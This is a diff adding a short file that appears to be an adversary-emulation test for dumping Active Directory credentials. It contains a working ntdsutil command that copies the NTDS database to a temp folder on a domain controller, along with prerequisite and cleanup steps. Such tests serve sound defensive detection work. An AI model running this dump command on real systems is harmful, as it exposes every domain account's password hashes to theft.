@@ -1,0 +1,20 @@
+#TechniqueName: OS Credential Dumping: NTDS
+#AtomicTestName: Dump Active Directory Database with NTDSUtil
+#Language: cmd
+
+#get_prereq_commands
+echo Sorry, Promoting this machine to a Domain Controller must be done manually
+
+
+#prereq_commands
+reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions  /v ProductType | findstr LanmanNT
+
+
+#commands
+mkdir C:\Windows\Temp\ntds_T1003
+ntdsutil "ac i ntds" "ifm" "create full C:\Windows\Temp\ntds_T1003" q q
+
+
+#cleanup_commands
+rmdir /q /s C:\Windows\Temp\ntds_T1003 >nul 2>&1
+
